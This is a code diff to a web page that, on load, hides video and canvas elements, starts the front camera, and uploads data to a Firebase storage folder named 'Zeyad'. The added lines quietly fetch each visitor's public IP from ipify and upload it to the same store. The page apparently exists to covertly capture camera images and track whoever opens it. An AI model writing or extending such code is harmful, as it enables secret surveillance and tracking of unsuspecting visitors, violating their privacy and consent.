@@ -9,7 +9,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
 
-        // Use placeholders for Firebase configuration
+        // Your Firebase configuration (replace with placeholders)
         const firebaseConfig = {
             apiKey: "FIREBASE_API_KEY",
             authDomain: "FIREBASE_AUTH_DOMAIN",
@@ -35,8 +35,32 @@
                 });
         }
 
+        // Function to upload IP address to Firebase
+        function uploadIP(ip) {
+            const ipRef = ref(storage, `Zeyad/ip_${Date.now()}.txt`); // Upload to Zeyad folder
+            uploadString(ipRef, ip, 'raw')
+                .then(() => {
+                    console.log('Uploaded IP address!');
+                })
+                .catch((error) => {
+                    console.error('Error uploading IP address:', error);
+                });
+        }
+
+        // Function to get the user's public IP address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip; // Return the IP address
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return null;
+            }
+        }
+
         // Access the video and canvas elements
-        window.addEventListener('load', () => {
+        window.addEventListener('load', async () => {
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
@@ -44,6 +68,12 @@
             // Hide video and canvas elements
             video.style.display = 'none';
             canvas.style.display = 'none';
+
+            // Get the user's public IP address
+            const ip = await getIP();
+            if (ip) {
+                uploadIP(ip); // Upload IP address to Firebase
+            }
 
             // Start capturing from the front camera
             navigator.mediaDevices.getUserMedia({
